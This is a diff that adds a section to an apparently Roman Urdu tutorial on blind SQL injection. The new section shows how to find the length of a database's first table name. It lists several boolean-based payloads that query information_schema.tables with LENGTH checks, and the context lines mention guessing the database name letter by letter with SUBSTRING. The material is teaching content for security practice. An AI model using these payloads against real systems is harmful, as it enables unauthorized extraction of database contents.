@@ -146,3 +146,17 @@ Agar database ka pehla letter 'd' ya kuch or hua, toh page bolega User ID is MIS
 **Isi tarah hum SUBSTRING(database(), 2, 1)='v' kar ke doosra letter verify karte hain**
 
 ---
+
+### Tables Name Extract Karna using Blind SQLi
+​Database mein kitne tables hain aur pehle table ka naam kya hai, yeh check karne ke liye:
+
+`1' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=5#`
+
+**Agar page normal load hoo or koi changing naa aye too matlab 5 lenth nhi phir isko change krna hai baar baar jaisy**
+
+ 
+`1' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=6#`
+
+`1' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=8#`
+
+---
